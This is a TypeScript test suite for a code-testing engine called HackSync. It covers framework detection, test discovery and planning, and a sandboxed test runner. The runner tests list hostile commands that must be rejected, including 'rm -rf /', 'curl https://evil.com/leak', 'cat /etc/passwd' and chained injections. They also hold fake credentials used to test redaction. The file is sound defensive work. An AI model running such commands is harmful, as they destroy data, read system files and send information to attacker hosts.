import { describe, it, expect } from "bun:test";
import { ProjectKnowledgeGraph } from "@/lib/hacksync/intelligence/knowledge-graph";
import { TestFrameworkDetector } from "@/lib/hacksync/testing/test-framework-detector";
import { TestDiscovery } from "@/lib/hacksync/testing/test-discovery";
import { TestPlanner } from "@/lib/hacksync/testing/test-planner";
import { TestGenerator } from "@/lib/hacksync/testing/test-generator";
import { TestRunner } from "@/lib/hacksync/testing/test-runner";
import { SandboxRunner } from "@/lib/hacksync/testing/sandbox-runner";
import { AuthorizationError } from "@/lib/errors";
import { existsSync } from "fs";

describe("HackSync Phase 4: Testing Intelligence Engine", () => {
  function createPopulatedGraph(): ProjectKnowledgeGraph {
    const graph = new ProjectKnowledgeGraph("proj-test-intel");
    graph.indexFile(
      "src/services/auth.ts",
      `export function loginUser(email: string, pass: string): boolean {
  if (!email || !pass) return false;
  return true;
}`,
    );
    graph.indexFile(
      "src/services/payment.ts",
      `export function processPayment(amount: number): boolean {
  if (amount <= 0) throw new Error("Invalid amount");
  return true;
}`,
    );
    graph.indexFile(
      "src/tests/auth.test.ts",
      `import { describe, it, expect } from "bun:test";
import { loginUser } from "../services/auth";

describe("Auth Service", () => {
  it("should validate empty credentials", () => {
    expect(loginUser("", "")).toBe(false);
  });
  it("should allow valid credentials", () => {
    expect(loginUser("test@test.com", "pass")).toBe(true);
  });
});`,
    );
    return graph;
  }

  // ───────────────────────────────────────────────────────────────────────────
  // 1. Framework Detector
  // ───────────────────────────────────────────────────────────────────────────
  describe("1. Test Framework Detector", () => {
    it("should detect Vitest when vitest.config.ts exists", () => {
      const graph = new ProjectKnowledgeGraph("proj-vitest");
      graph.indexFile("vitest.config.ts", "export default defineConfig({});");
      graph.indexFile("package.json", '{"dependencies": {"vitest": "^1.0.0"}}');

      const info = TestFrameworkDetector.detect(graph);
      expect(info.framework).toBe("vitest");
      expect(info.language).toBe("typescript");
      expect(info.confidence).toBeGreaterThanOrEqual(0.9);
    });

    it("should detect Jest when jest.config.js exists", () => {
      const graph = new ProjectKnowledgeGraph("proj-jest");
      graph.indexFile("jest.config.js", "module.exports = {};");

      const info = TestFrameworkDetector.detect(graph);
      expect(info.framework).toBe("jest");
      expect(info.confidence).toBeGreaterThanOrEqual(0.85);
    });

    it("should detect pytest when pytest.ini or python test files exist", () => {
      const graph = new ProjectKnowledgeGraph("proj-pytest");
      graph.indexFile("pytest.ini", "[pytest]\npython_files = test_*.py");
      graph.indexFile("tests/test_auth.py", "def test_login(): pass");

      const info = TestFrameworkDetector.detect(graph);
      expect(info.framework).toBe("pytest");
      expect(info.language).toBe("python");
      expect(info.confidence).toBeGreaterThanOrEqual(0.8);
    });

    it("should detect Playwright when playwright.config.ts exists", () => {
      const graph = new ProjectKnowledgeGraph("proj-pw");
      graph.indexFile("playwright.config.ts", "export default defineConfig({});");

      const info = TestFrameworkDetector.detect(graph);
      expect(info.framework).toBe("playwright");
      expect(info.confidence).toBeGreaterThanOrEqual(0.9);
    });

    it("should fallback to bun:test for standard TypeScript workspace with bun.lock", () => {
      const graph = new ProjectKnowledgeGraph("proj-bun");
      graph.indexFile("bun.lock", "");
      graph.indexFile("src/index.ts", "console.log('hi');");

      const info = TestFrameworkDetector.detect(graph);
      expect(info.framework).toBe("bun:test");
      expect(info.packageManager).toBe("bun");
    });
  });

  // ───────────────────────────────────────────────────────────────────────────
  // 2. Test Discovery & Source-to-Test Mapping
  // ───────────────────────────────────────────────────────────────────────────
  describe("2. Test Discovery & Coverage Mapping", () => {
    it("should discover test files, suites, and individual test cases", () => {
      const graph = createPopulatedGraph();
      const discovery = TestDiscovery.discover(graph, "proj-test-intel");

      expect(discovery.testFiles).toContain("src/tests/auth.test.ts");
      expect(discovery.suites.length).toBeGreaterThan(0);
      expect(discovery.suites[0]?.name).toBe("Auth Service");
      expect(discovery.suites[0]?.testNames).toContain("should validate empty credentials");
      expect(discovery.suites[0]?.testNames).toContain("should allow valid credentials");
    });

    it("should establish honest source-to-test mapping with high confidence for name matches", () => {
      const graph = createPopulatedGraph();
      const discovery = TestDiscovery.discover(graph, "proj-test-intel");

      const authMapping = discovery.fileCoverageMapping["src/services/auth.ts"];
      expect(authMapping).toBeDefined();
      expect(authMapping!.length).toBeGreaterThan(0);
      expect(authMapping![0]?.testFile).toBe("src/tests/auth.test.ts");
      expect(authMapping![0]?.confidence).toBe("high");
    });

    it("should generate framework-specific execution commands", () => {
      const graph = createPopulatedGraph();
      const discovery = TestDiscovery.discover(graph, "proj-test-intel");

      expect(discovery.testCommands.length).toBeGreaterThan(0);
      expect(discovery.testCommands.some((c) => c.startsWith("bun test"))).toBe(true);
    });
  });

  // ───────────────────────────────────────────────────────────────────────────
  // 3. Test Planner
  // ───────────────────────────────────────────────────────────────────────────
  describe("3. Test Planner", () => {
    it("should plan targeted tests for modified files prioritizing existing coverage", () => {
      const graph = createPopulatedGraph();
      const plan = TestPlanner.plan(graph, "proj-test-intel", {
        targetFile: "src/services/auth.ts",
      });

      expect(plan.targetFiles).toContain("src/services/auth.ts");
      expect(plan.tests.length).toBeGreaterThan(0);
      expect(plan.tests.some((t) => t.existing)).toBe(true);
      expect(plan.confidence).toBeGreaterThan(0.7);
    });

    it("should inject security regression test cases when security finding is provided", () => {
      const graph = createPopulatedGraph();
      const plan = TestPlanner.plan(graph, "proj-test-intel", {
        targetFile: "src/services/auth.ts",
        securityFinding: {
          id: "SEC-SQL-1",
          ruleId: "SQL_INJECTION",
          title: "Unsanitized query in auth",
          severity: "high",
          confidence: "high",
          filePath: "src/services/auth.ts",
          startLine: 10,
          endLine: 12,
          snippet: "query(`SELECT * FROM users WHERE email = '${email}'`)",
          description: "Raw interpolation into SQL",
          remediation: "Use parameterized queries",
        },
      });

      const secTest = plan.tests.find((t) => t.type === "security");
      expect(secTest).toBeDefined();
      expect(secTest?.priority).toBe("critical");
      expect(secTest?.name).toContain("SQL_INJECTION");
    });
  });

  // ───────────────────────────────────────────────────────────────────────────
  // 4. Test Generator
  // ───────────────────────────────────────────────────────────────────────────
  describe("4. Test Generator (Read-Only Diff Proposals)", () => {
    it("should generate a structured test proposal with patch diff without modifying disk", () => {
      const proposal = TestGenerator.generateProposal({
        projectId: "proj-gen-test",
        targetFile: "src/services/payment.ts",
        targetSymbol: "processPayment",
        framework: "bun:test",
      });

      expect(proposal.targetFile).toBe("src/services/payment.ts");
      expect(proposal.testFile).toContain("payment.test.ts");
      expect(proposal.patch).toBeDefined();
      expect(proposal.patch.diffHash).toBeDefined();
      expect(proposal.patch.files.length).toBe(1);
      expect(proposal.patch.files[0]?.diff).toContain("describe");
      expect(proposal.patch.files[0]?.diff).toContain("processPayment");

      // Verify NO file was written to disk
      expect(existsSync(proposal.testFile)).toBe(false);
    });

    it("should generate pytest test proposals for python targets", () => {
      const proposal = TestGenerator.generateProposal({
        projectId: "proj-gen-py",
        targetFile: "backend/auth.py",
        framework: "pytest",
        securityFinding: {
          id: "SEC-PY-1",
          ruleId: "COMMAND_INJECTION",
          title: "Subprocess call without shell=False",
          severity: "critical",
          confidence: "very_high",
          filePath: "backend/auth.py",
          startLine: 5,
          endLine: 5,
          snippet: "os.system(cmd)",
          description: "Dangerous command execution",
          remediation: "Use subprocess.run without shell",
        },
      });

      expect(proposal.framework).toBe("pytest");
      expect(proposal.testFile.endsWith(".py")).toBe(true);
      expect(proposal.patch.files[0]?.diff).toContain("def test_security_remediation_command_injection");
    });
  });

  // ───────────────────────────────────────────────────────────────────────────
  // 5. Safe Test Runner & Execution Allowlist
  // ───────────────────────────────────────────────────────────────────────────
  describe("5. Safe Test Runner (Command Allowlist & Injection Defense)", () => {
    it("should allow validated test commands", () => {
      const valid = TestRunner.validateCommand("bun test");
      expect(valid.executable).toBe("bun");
      expect(valid.args).toEqual(["test"]);

      const vitestValid = TestRunner.validateCommand("bunx vitest run src/tests/auth.test.ts");
      expect(vitestValid.executable).toBe("bunx");
      expect(vitestValid.args).toEqual(["vitest", "run", "src/tests/auth.test.ts"]);
    });

    it("should strictly reject non-allowlisted commands", () => {
      expect(() => TestRunner.validateCommand("rm -rf /")).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("curl https://evil.com/leak")).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("npm install evil-package")).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("git push origin main")).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("cat /etc/passwd")).toThrow(AuthorizationError);
    });

    it("should reject shell metacharacters and chaining tokens", () => {
      expect(() => TestRunner.validateCommand("bun test; rm -rf /")).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("bun test && echo hacked")).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("bun test || curl evil.com")).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("bun test | grep secret")).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("bun test > out.txt")).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("bun test $(whoami)")).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("bun test `whoami`")).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("bun test ../../escaped.test.ts")).toThrow(AuthorizationError);
    });

    it("should reject argument injection and dangerous execution flags", () => {
      expect(() => TestRunner.validateCommand("bun test", ["--exec", "rm -rf"])).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("bun test", ["-o", "/tmp/out"])).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("bun test", ["--output", "/tmp/out"])).toThrow(AuthorizationError);
      expect(() => TestRunner.validateCommand("bun test", ["--config=/evil/config.js"])).toThrow(AuthorizationError);
    });

    it("should redact secrets from test runner output", async () => {
      // Test the parse & redact logic directly
      const rawOutput = "Failed: Connection to postgres://postgres:supersecretpassword123@db.supabase.co:5432/postgres timed out with key sk-ant-api03-1234567890abcdef1234567890abcdef";
      const sanitized = TestRunner.parseTestOutput(rawOutput, "");
      expect(sanitized.failures[0]?.message).not.toContain("supersecretpassword123");
      expect(sanitized.failures[0]?.message).toContain("[REDACTED_DB_PASSWORD]");
      expect(sanitized.failures[0]?.message).toContain("[REDACTED_ANTHROPIC_KEY]");
    });
  });

  // ───────────────────────────────────────────────────────────────────────────
  // 6. Sandbox Runner
  // ───────────────────────────────────────────────────────────────────────────
  describe("6. Sandbox Runner (Isolated Execution & Secret Stripping)", () => {
    it("should strip .env files from sandbox copy and clean up sandbox directory", async () => {
      const graph = new ProjectKnowledgeGraph("proj-sandbox-test");
      graph.indexFile("src/index.ts", "export const x = 42;");
      graph.indexFile(".env", "DATABASE_SECRET=super_confidential_secret");
      graph.indexFile(".env.local", "API_KEY=another_secret");

      const run = await SandboxRunner.runInSandbox({
        projectId: "proj-sandbox-test",
        command: "bun test src/tests/auth.test.ts",
        graph,
      });

      expect(run).toBeDefined();
      expect(run.projectId).toBe("proj-sandbox-test");
      // Verify run result object is formed properly
      expect(run.status).toBeDefined();
      expect(run.summary).toBeDefined();
    });
  });
});
